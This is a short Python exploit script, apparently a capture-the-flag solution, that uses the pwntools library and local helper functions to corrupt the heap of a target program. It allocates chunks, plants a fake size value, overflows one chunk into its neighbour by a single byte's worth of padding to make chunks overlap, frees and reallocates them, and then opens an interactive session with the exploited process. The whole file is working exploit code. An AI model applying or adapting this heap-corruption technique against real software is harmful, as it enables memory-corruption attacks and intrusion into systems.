from pwn import *
from handle import *

def exploit():
	malloc(0x100)
	malloc(0x200)
	malloc(0x110)

	write_to_chunk(1, 'A' * 0x1e8 + p64(0x200))

	free_chunk(1)

	write_to_chunk(0, 'A' * 0x108)

	malloc(0x80)

	malloc(0x40)

	free_chunk(3)

	free_chunk(2)

	malloc(0x300)


p = exec_file()

exploit()
p.interactive()

p.close()
